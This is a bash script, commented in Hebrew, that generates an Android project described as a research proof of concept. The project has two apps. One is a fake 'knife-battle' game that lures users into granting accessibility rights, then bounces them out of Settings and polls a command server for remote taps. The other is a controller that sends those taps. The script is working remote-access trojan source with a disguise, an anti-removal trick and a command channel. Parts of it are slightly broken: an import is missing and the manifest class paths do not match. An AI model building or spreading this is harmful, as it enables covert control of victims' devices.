#!/usr/bin/env bash

set -e  # יעצור אם יש שגיאה

echo "=== התחלת יצירת פרויקט PoC ==="

# שלב 1: הורד טמפלייט מינימלי רשמי של אנדרואיד
echo "מוריד טמפלייט מינימלי..."
git clone --depth 1 https://github.com/android/gradle-recipes.git temp-template || { echo "שגיאה בהורדה"; exit 1; }

echo "מעתיק קבצים..."
cp -r temp-template/templates/minimal-application/* . || { echo "שגיאה בהעתקה"; exit 1; }
rm -rf temp-template

# שלב 2: התאמה של flavors + שמות APK
echo "מעדכן build.gradle..."
sed -i '/defaultConfig {/a \
    flavorDimensions = ["type"]\
    productFlavors {\
        victim {\
            dimension "type"\
            applicationIdSuffix ".victim"\
            archivesBaseName = "knife-battle"\
        }\
        controller {\
            dimension "type"\
            applicationIdSuffix ".controller"\
            archivesBaseName = "remote-control"\
        }\
    }' app/build.gradle

# שלב 3: עדכון manifest עם שמות הקלאסים שלך
echo "מעדכן AndroidManifest.xml..."
cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />

    <application android:allowBackup="false" android:label="PoC">

        <!-- Victim - jhome.java -->
        <activity android:name=".jhome$LoadingActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service android:name=".jhome$StealthService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service" />
        </service>

        <!-- Controller - manager.java -->
        <activity android:name=".manager" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>
</manifest>
EOF

# שלב 4: יצירת accessibility_service.xml
mkdir -p app/src/main/res/xml
cat > app/src/main/res/xml/accessibility_service.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canPerformGestures="true"
    android:description="@string/accessibility_desc" />
EOF

# שלב 5: strings.xml
cat > app/src/main/res/values/strings.xml << 'EOF'
<resources>
    <string name="app_name">PoC</string>
    <string name="accessibility_desc">Research PoC Accessibility Service</string>
</resources>
EOF

# שלב 6: jhome.java - קוד Victim מלא (נשלט)
mkdir -p app/src/main/java/com/research/lab/victim
cat > app/src/main/java/com/research/lab/victim/jhome.java << 'EOF'
package com.research.lab.victim;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Path;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class jhome {

    private static final String TAG = "KnifeBattle";
    private static final String C2_URL = "http://192.168.1.100:8000/cmd";

    public static class LoadingActivity extends Activity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            LinearLayout ll = new LinearLayout(this);
            ll.setOrientation(LinearLayout.VERTICAL);
            ll.setGravity(Gravity.CENTER);

            TextView tv = new TextView(this);
            tv.setText("Loading game...");
            tv.setTextSize(22);
            ll.addView(tv);

            Button btn = new Button(this);
            btn.setText("Enable Accessibility");
            btn.setVisibility(View.GONE);
            ll.addView(btn);

            setContentView(ll);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                tv.setText("Enable in Settings to play");
                btn.setVisibility(View.VISIBLE);
            }, 3000);

            btn.setOnClickListener(v -> 
                startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
            );
        }
    }

    public static class StealthService extends AccessibilityService {
        private long last = 0;

        @Override
        public void onAccessibilityEvent(AccessibilityEvent e) {
            if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
                if (pkg.contains("com.android.settings")) {
                    performGlobalAction(GLOBAL_ACTION_HOME);
                }
            }

            long now = System.currentTimeMillis();
            if (now - last > 10000) {
                last = now;
                new Thread(this::pollC2).start();
            }
        }

        private void pollC2() {
            try {
                URL url = new URL(C2_URL);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                if (c.getResponseCode() == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    handle(sb.toString());
                    br.close();
                }
                c.disconnect();
            } catch (Exception ignored) {}
        }

        private void handle(String json) {
            try {
                JSONObject o = new JSONObject(json);
                if ("tap".equals(o.optString("action"))) {
                    float x = (float) o.optDouble("x", 540);
                    float y = (float) o.optDouble("y", 960);
                    Path p = new Path();
                    p.moveTo(x, y);
                    GestureDescription gd = new GestureDescription.Builder()
                        .addStroke(new GestureDescription.StrokeDescription(p, 0, 60))
                        .build();
                    dispatchGesture(gd, null, null);
                }
            } catch (Exception ignored) {}
        }

        @Override
        public void onInterrupt() {}
    }
}
EOF

# manager.java - קוד Controller מלא (שולט)
mkdir -p app/src/main/java/com/research/lab/controller
cat > app/src/main/java/com/research/lab/controller/manager.java << 'EOF'
package com.research.lab.controller;

import android.app.Activity;
import android.os.Bundle;
import android.view.MotionEvent;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class manager extends Activity {
    private TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(40, 40, 40, 40);

        tv = new TextView(this);
        tv.setText("Touch to control target");
        tv.setTextSize(18);
        root.addView(tv);

        View area = new View(this);
        area.setBackgroundColor(0x220000FF);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 1400);
        area.setLayoutParams(p);
        root.addView(area);

        setContentView(root);

        area.setOnTouchListener((v, e) -> {
            if (e.getAction() == MotionEvent.ACTION_DOWN || e.getAction() == MotionEvent.ACTION_MOVE) {
                float x = e.getX();
                float y = e.getY();
                tv.setText(String.format("X:%.0f Y:%.0f", x, y));
                send(x, y);
                return true;
            }
            return false;
        });
    }

    private void send(float x, float y) {
        new Thread(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("action", "tap");
                o.put("x", x);
                o.put("y", y);

                URL url = new URL("http://192.168.1.100:8000/cmd");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(o.toString().getBytes("UTF-8"));
                }
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }
}
EOF

# שלב סופי: עדכון gradle.properties ל-AndroidX
cat > gradle.properties << 'END'
android.useAndroidX=true
android.enableJetifier=true
org.gradle.jvmargs=-Xmx2048m
END

echo "=== הכל נוצר! ==="
echo "עכשיו הרץ את ה-workflow ב-Actions כדי לבנות את ה-APKs"
echo "ה-APKs יהיו: knife-battle-debug.apk ו-remote-control-debug.apk"
